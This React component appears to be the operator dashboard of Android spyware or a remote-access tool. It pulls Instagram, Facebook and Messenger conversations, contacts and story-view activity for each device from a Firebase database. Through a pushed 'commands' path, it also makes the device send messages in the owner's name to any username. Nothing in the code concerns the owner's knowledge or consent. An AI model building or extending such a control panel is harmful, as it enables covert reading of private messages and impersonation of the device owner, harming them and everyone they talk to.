import React, { useEffect, useState, useMemo, useRef } from "react";
import {
  ref,
  get,
  push,
  set,
  onValue,
  query,
  orderByChild,
  limitToLast,
} from "firebase/database";
import { database as db } from "../firebaseConfig";
import "./SocialMediaTab.css";

const formatDate = (timestamp) => {
  if (typeof timestamp !== "number" && (!timestamp || !timestamp.toDate)) {
    return "Invalid date";
  }
  const date =
    typeof timestamp === "number" ? new Date(timestamp) : timestamp.toDate();
  return date.toLocaleString();
};

const formatUsername = (username) => {
  if (!username || typeof username !== "string") return username || "Unknown";
  return username.startsWith("@") ? username : `@${username}`;
};

const getPlatformIcon = (platform) => {
  switch (platform) {
    case "Instagram":
      return "📷";
    case "Facebook":
      return "📘";
    case "Messenger":
      return "💬";
    case "Facebook Lite":
      return "📱";
    default:
      return "📱";
  }
};

const SocialMediaTab = () => {
  const [deviceIds, setDeviceIds] = useState([]);
  const [selectedDevice, setSelectedDevice] = useState("");
  const [messages, setMessages] = useState([]);
  const [contacts, setContacts] = useState({});
  const [activity, setActivity] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [activeChatId, setActiveChatId] = useState(null);
  const [replyText, setReplyText] = useState("");
  const [newMessage, setNewMessage] = useState({
    username: "",
    content: "",
    packageName: "com.instagram.android",
  });
  const [stats, setStats] = useState({
    totalMessages: 0,
    uniqueChats: 0,
    newContacts: 0,
    platforms: {},
  });
  const [filterType, setFilterType] = useState("all");
  const [platformFilter, setPlatformFilter] = useState("all");
  const [searchQuery, setSearchQuery] = useState("");
  const [dateFilter, setDateFilter] = useState({
    start: "",
    end: "",
    enabled: false,
  });
  const [lastSync, setLastSync] = useState(null);
  const [activeTab, setActiveTab] = useState("messages");
  const chatContainerRef = useRef(null);

  const platformOptions = [
    { value: "com.instagram.android", label: "Instagram", icon: "📷" },
    { value: "com.facebook.katana", label: "Facebook", icon: "📘" },
    { value: "com.facebook.orca", label: "Messenger", icon: "💬" },
    { value: "com.facebook.lite", label: "Facebook Lite", icon: "📱" },
  ];

  useEffect(() => {
    const fetchDevices = async () => {
      setLoading(true);
      setError(null);
      try {
        const snapshot = await get(ref(db, "Device"));
        if (!snapshot.exists()) {
          setError("No devices found.");
          setDeviceIds([]);
          setSelectedDevice("");
        } else {
          const devices = Object.keys(snapshot.val() || {});
          setDeviceIds(devices);
          if (devices.length > 0 && !selectedDevice) {
            setSelectedDevice(devices[0]);
          }
        }
      } catch (err) {
        setError(`Failed to fetch devices: ${err.message}`);
      } finally {
        setLoading(false);
      }
    };
    fetchDevices();
  }, [selectedDevice]);

  useEffect(() => {
    if (!selectedDevice) {
      setMessages([]);
      setContacts({});
      setActivity([]);
      setLastSync(null);
      return;
    }

    const messagesRef = ref(db, `Device/${selectedDevice}/social_media/data`);
    const contactsRef = ref(
      db,
      `Device/${selectedDevice}/social_media/contacts`
    );
    const activityRef = ref(
      db,
      `Device/${selectedDevice}/social_media/activity`
    );
    const messagesQuery = query(
      messagesRef,
      orderByChild("timestamp"),
      limitToLast(100)
    );

    const unsubscribeMessages = onValue(
      messagesQuery,
      (snapshot) => {
        if (!snapshot.exists()) {
          setMessages([]);
        } else {
          const messagesData = [];
          let latestUploadTime = 0;
          snapshot.forEach((child) => {
            const messageData = { id: child.key, ...child.val() };
            if (
              messageData.uploaded &&
              messageData.uploaded > latestUploadTime
            ) {
              latestUploadTime = messageData.uploaded;
            }
            messagesData.push(messageData);
          });
          messagesData.sort((a, b) => b.timestamp - a.timestamp);
          setMessages(messagesData);
          if (latestUploadTime > 0) {
            setLastSync(latestUploadTime);
          }
        }
      },
      (err) => setError(`Failed to fetch messages: ${err.message}`)
    );

    const unsubscribeContacts = onValue(
      contactsRef,
      (snapshot) => {
        if (snapshot.exists()) {
          setContacts(snapshot.val());
        }
      },
      (err) => setError(`Failed to fetch contacts: ${err.message}`)
    );

    const unsubscribeActivity = onValue(
      activityRef,
      (snapshot) => {
        if (snapshot.exists()) {
          const activityData = [];
          snapshot.forEach((child) => {
            activityData.push({ id: child.key, ...child.val() });
          });
          activityData.sort((a, b) => b.timestamp - a.timestamp);
          setActivity(activityData.slice(0, 50)); // Keep last 50 activities
        }
      },
      (err) => setError(`Failed to fetch activity: ${err.message}`)
    );

    return () => {
      unsubscribeMessages();
      unsubscribeContacts();
      unsubscribeActivity();
    };
  }, [selectedDevice]);

  const filteredMessages = useMemo(() => {
    let filtered = [...messages];

    if (filterType !== "all") {
      filtered = filtered.filter((msg) =>
        filterType === "NewContact" ? msg.isNewContact : msg.type === filterType
      );
    }

    if (platformFilter !== "all") {
      filtered = filtered.filter((msg) => msg.packageName === platformFilter);
    }

    if (searchQuery) {
      filtered = filtered.filter((msg) =>
        [msg.sender, msg.recipient, msg.content].some((field) =>
          field?.toLowerCase().includes(searchQuery.toLowerCase())
        )
      );
    }

    if (dateFilter.enabled && dateFilter.start && dateFilter.end) {
      const start = new Date(dateFilter.start).getTime();
      const end = new Date(dateFilter.end).getTime() + 86400000;
      filtered = filtered.filter(
        (msg) => msg.timestamp >= start && msg.timestamp <= end
      );
    }

    return filtered;
  }, [messages, filterType, platformFilter, searchQuery, dateFilter]);

  const messagesByChat = useMemo(() => {
    return filteredMessages.reduce((acc, msg) => {
      const chatId = msg.sender === "You" ? msg.recipient : msg.sender;
      if (!chatId) return acc;
      acc[chatId] = acc[chatId] || [];
      acc[chatId].push(msg);
      return acc;
    }, {});
  }, [filteredMessages]);

  const sortedChats = useMemo(() => {
    return Object.keys(messagesByChat).sort((a, b) => {
      const aDate = Math.max(
        ...messagesByChat[a].map((msg) => msg.timestamp || 0)
      );
      const bDate = Math.max(
        ...messagesByChat[b].map((msg) => msg.timestamp || 0)
      );
      return bDate - aDate;
    });
  }, [messagesByChat]);

  useEffect(() => {
    const newContacts = filteredMessages.filter(
      (msg) => msg.isNewContact
    ).length;
    const platformStats = filteredMessages.reduce((acc, msg) => {
      const platform = msg.platform || "Unknown";
      acc[platform] = (acc[platform] || 0) + 1;
      return acc;
    }, {});

    setStats({
      totalMessages: filteredMessages.length,
      uniqueChats: Object.keys(messagesByChat).length,
      newContacts,
      platforms: platformStats,
    });
  }, [filteredMessages, messagesByChat]);

  useEffect(() => {
    if (chatContainerRef.current) {
      chatContainerRef.current.scrollTop =
        chatContainerRef.current.scrollHeight;
    }
  }, [messagesByChat, activeChatId]);

  const sendReply = async () => {
    if (!selectedDevice || !activeChatId || !replyText.trim()) return;
    try {
      const sendRef = ref(db, `Device/${selectedDevice}/social_media/commands`);
      const newCommandRef = push(sendRef);
      await set(newCommandRef, {
        username: activeChatId,
        message: replyText,
        packageName: messagesByChat[activeChatId][0].packageName,
      });
      setReplyText("");
    } catch (err) {
      setError(`Failed to send reply: ${err.message}`);
    }
  };

  const sendNewMessage = async () => {
    if (
      !selectedDevice ||
      !newMessage.username.trim() ||
      !newMessage.content.trim()
    )
      return;
    try {
      const sendRef = ref(db, `Device/${selectedDevice}/social_media/commands`);
      const newCommandRef = push(sendRef);
      await set(newCommandRef, {
        username: newMessage.username,
        message: newMessage.content,
        packageName: newMessage.packageName,
      });
      setNewMessage({
        username: "",
        content: "",
        packageName: "com.instagram.android",
      });
    } catch (err) {
      setError(`Failed to send message: ${err.message}`);
    }
  };

  const handleDateFilterChange = (e) => {
    const { name, value } = e.target;
    setDateFilter((prev) => ({ ...prev, [name]: value }));
  };

  const toggleDateFilter = () => {
    setDateFilter((prev) => ({ ...prev, enabled: !prev.enabled }));
  };

  const toggleChatDetails = (chatId) => {
    setActiveChatId(activeChatId === chatId ? null : chatId);
  };

  const getPlatformLabel = (packageName) => {
    const platform = platformOptions.find((p) => p.value === packageName);
    return platform ? platform.label : "Unknown";
  };

  return (
    <div className="social-media-container">
      <div className="control-panel">
        <div className="control-panel-header">
          <h2 className="panel-title">Social Media Monitor</h2>
          {lastSync && (
            <div className="last-sync">
              Last synced: {new Date(lastSync).toLocaleString()}
            </div>
          )}
        </div>

        <div className="tab-navigation">
          <button
            className={`tab-button ${activeTab === "messages" ? "active" : ""}`}
            onClick={() => setActiveTab("messages")}
          >
            💬 Messages
          </button>
          <button
            className={`tab-button ${activeTab === "activity" ? "active" : ""}`}
            onClick={() => setActiveTab("activity")}
          >
            📊 Activity
          </button>
        </div>

        <div className="control-panel-grid">
          <div className="device-selector">
            <label htmlFor="device-select">Device:</label>
            <select
              id="device-select"
              value={selectedDevice}
              onChange={(e) => setSelectedDevice(e.target.value)}
              disabled={loading || deviceIds.length === 0}
            >
              {deviceIds.length === 0 ? (
                <option value="">No devices found</option>
              ) : (
                deviceIds.map((deviceId) => (
                  <option key={deviceId} value={deviceId}>
                    {deviceId}
                  </option>
                ))
              )}
            </select>
          </div>

          {activeTab === "messages" && (
            <div className="message-controls">
              <div className="new-message-form">
                <input
                  type="text"
                  placeholder="Username (e.g., @username)"
                  value={newMessage.username}
                  onChange={(e) =>
                    setNewMessage({ ...newMessage, username: e.target.value })
                  }
                  aria-label="New message username"
                />
                <textarea
                  placeholder="Message"
                  value={newMessage.content}
                  onChange={(e) =>
                    setNewMessage({ ...newMessage, content: e.target.value })
                  }
                  aria-label="New message content"
                />
                <select
                  value={newMessage.packageName}
                  onChange={(e) =>
                    setNewMessage({
                      ...newMessage,
                      packageName: e.target.value,
                    })
                  }
                  aria-label="Select platform"
                >
                  {platformOptions.map((platform) => (
                    <option key={platform.value} value={platform.value}>
                      {platform.icon} {platform.label}
                    </option>
                  ))}
                </select>
                <div className="form-buttons">
                  <button
                    onClick={sendNewMessage}
                    disabled={
                      !newMessage.username.trim() || !newMessage.content.trim()
                    }
                  >
                    Send
                  </button>
                  <button
                    onClick={() =>
                      setNewMessage({
                        username: "",
                        content: "",
                        packageName: "com.instagram.android",
                      })
                    }
                  >
                    Clear
                  </button>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>

      {activeTab === "messages" && (
        <>
          <div className="filters-panel">
            <h3 className="filters-title">Filters</h3>
            <div className="filters-grid">
              <div className="filter-section">
                <h4 className="filter-section-title">Message Type</h4>
                <div className="filter-type">
                  {["all", "Sent", "Received", "Reply", "NewContact"].map(
                    (type) => (
                      <button
                        key={type}
                        className={`filter-button ${
                          filterType === type ? "active" : ""
                        }`}
                        onClick={() => setFilterType(type)}
                      >
                        {type}
                      </button>
                    )
                  )}
                </div>
              </div>

              <div className="filter-section">
                <h4 className="filter-section-title">Platform</h4>
                <div className="filter-type">
                  <button
                    className={`filter-button ${
                      platformFilter === "all" ? "active" : ""
                    }`}
                    onClick={() => setPlatformFilter("all")}
                  >
                    All
                  </button>
                  {platformOptions.map((platform) => (
                    <button
                      key={platform.value}
                      className={`filter-button ${
                        platformFilter === platform.value ? "active" : ""
                      }`}
                      onClick={() => setPlatformFilter(platform.value)}
                    >
                      {platform.icon} {platform.label}
                    </button>
                  ))}
                </div>
              </div>

              <div className="filter-section">
                <h4 className="filter-section-title">Search</h4>
                <div className="search-filter">
                  <input
                    type="text"
                    placeholder="Search chats or content..."
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                  />
                  {searchQuery && (
                    <button
                      className="clear-search"
                      onClick={() => setSearchQuery("")}
                    >
                      Clear
                    </button>
                  )}
                </div>
              </div>

              <div className="filter-section date-filter-section">
                <div className="date-filter-header">
                  <h4 className="filter-section-title">Date Range Filter</h4>
                  <label className="toggle-switch">
                    <input
                      type="checkbox"
                      checked={dateFilter.enabled}
                      onChange={toggleDateFilter}
                    />
                    <span className="toggle-slider"></span>
                    <span className="toggle-label">
                      {dateFilter.enabled ? "Enabled" : "Disabled"}
                    </span>
                  </label>
                </div>
                <div
                  className={`date-range-inputs ${
                    dateFilter.enabled ? "enabled" : "disabled"
                  }`}
                >
                  <div className="date-range-input">
                    <label htmlFor="start-date">Start Date:</label>
                    <input
                      id="start-date"
                      type="date"
                      name="start"
                      value={dateFilter.start}
                      onChange={handleDateFilterChange}
                      disabled={!dateFilter.enabled}
                    />
                  </div>
                  <div className="date-range-input">
                    <label htmlFor="end-date">End Date:</label>
                    <input
                      id="end-date"
                      type="date"
                      name="end"
                      value={dateFilter.end}
                      onChange={handleDateFilterChange}
                      disabled={!dateFilter.enabled}
                    />
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="message-stats-dashboard">
            <div className="stat-card">
              <div className="stat-icon total-icon">💬</div>
              <div className="stat-content">
                <span className="stat-value">{stats.totalMessages}</span>
                <span className="stat-label">Total Messages</span>
              </div>
            </div>
            <div className="stat-card">
              <div className="stat-icon unique-icon">👥</div>
              <div className="stat-content">
                <span className="stat-value">{stats.uniqueChats}</span>
                <span className="stat-label">Unique Chats</span>
              </div>
            </div>
            <div className="stat-card">
              <div className="stat-icon new-icon">🆕</div>
              <div className="stat-content">
                <span className="stat-value">{stats.newContacts}</span>
                <span className="stat-label">New Contacts</span>
              </div>
            </div>
            <div className="stat-card">
              <div className="stat-icon platform-icon">📱</div>
              <div className="stat-content">
                <span className="stat-value">
                  {Object.keys(stats.platforms).length}
                </span>
                <span className="stat-label">Platforms</span>
              </div>
            </div>
          </div>

          {error && (
            <div className="error-message">
              <div className="error-icon">⚠️</div>
              <div className="error-text">{error}</div>
            </div>
          )}

          {loading && (
            <div className="message-loading">Loading messages...</div>
          )}

          {!loading && sortedChats.length === 0 && (
            <div className="no-messages">No messages found</div>
          )}

          {!loading && sortedChats.length > 0 && (
            <div className="message-list">
              <div className="message-list-by-chat">
                {sortedChats.map((chatId) => (
                  <div key={chatId} className="chat-group">
                    <div
                      className="chat-header"
                      onClick={() => toggleChatDetails(chatId)}
                    >
                      <img
                        src={
                          contacts[chatId]?.profileUrl || "/default-avatar.png"
                        }
                        alt="Profile"
                        className="chat-dp"
                      />
                      <div className="chat-info">
                        <h3 className="chat-username">
                          {formatUsername(chatId)}
                        </h3>
                        <div className="chat-platforms">
                          {[
                            ...new Set(
                              messagesByChat[chatId].map((msg) => msg.platform)
                            ),
                          ].map((platform) => (
                            <span key={platform} className="platform-badge">
                              {getPlatformIcon(platform)} {platform}
                            </span>
                          ))}
                        </div>
                      </div>
                      <span className="message-count">
                        {messagesByChat[chatId].length} messages
                      </span>
                      <span className="expand-indicator">
                        {activeChatId === chatId ? "▼" : "▶"}
                      </span>
                    </div>

                    <div className="chat-preview">
                      {messagesByChat[chatId][0] && (
                        <>
                          <span className="preview-content">
                            {messagesByChat[chatId][0].content.substring(0, 50)}
                            {messagesByChat[chatId][0].content.length > 50
                              ? "..."
                              : ""}
                          </span>
                          <span className="preview-time">
                            {formatDate(messagesByChat[chatId][0].timestamp)}
                          </span>
                        </>
                      )}
                    </div>

                    {activeChatId === chatId && (
                      <div className="chat-details">
                        <div className="chat-messages" ref={chatContainerRef}>
                          {messagesByChat[chatId].map((msg) => (
                            <div
                              key={msg.messageId}
                              className={`message ${
                                msg.sender === "You" ? "sent" : "received"
                              } ${msg.isNewContact ? "new-contact" : ""}`}
                            >
                              <div className="message-content">
                                <p>{msg.content}</p>
                                <div className="message-meta">
                                  <span className="message-time">
                                    {formatDate(msg.timestamp)}
                                  </span>
                                  <span className="message-platform">
                                    {getPlatformIcon(msg.platform)}{" "}
                                    {msg.platform}
                                  </span>
                                </div>
                              </div>
                            </div>
                          ))}
                        </div>
                        <div className="chat-input">
                          <textarea
                            value={replyText}
                            onChange={(e) => setReplyText(e.target.value)}
                            placeholder="Type a reply..."
                            aria-label="Reply message"
                          />
                          <button
                            onClick={sendReply}
                            disabled={!replyText.trim()}
                            aria-label="Send reply"
                          >
                            ➤
                          </button>
                        </div>
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>
          )}
        </>
      )}

      {activeTab === "activity" && (
        <div className="activity-panel">
          <h3 className="activity-title">Recent Activity</h3>
          <div className="activity-stats">
            {Object.entries(stats.platforms).map(([platform, count]) => (
              <div key={platform} className="activity-stat">
                <span className="activity-platform">
                  {getPlatformIcon(platform)} {platform}
                </span>
                <span className="activity-count">{count} messages</span>
              </div>
            ))}
          </div>

          <div className="activity-list">
            {activity.length === 0 ? (
              <div className="no-activity">No recent activity</div>
            ) : (
              activity.map((item) => (
                <div key={item.id} className="activity-item">
                  <div className="activity-icon">
                    {item.type === "story_view" ? "👁️" : "📱"}
                  </div>
                  <div className="activity-content">
                    <span className="activity-type">
                      {item.type === "story_view"
                        ? "Story Viewed"
                        : "Feed Activity"}
                    </span>
                    <span className="activity-platform">
                      {getPlatformIcon(item.platform)} {item.platform}
                    </span>
                    <span className="activity-time">
                      {formatDate(item.timestamp)}
                    </span>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default SocialMediaTab;
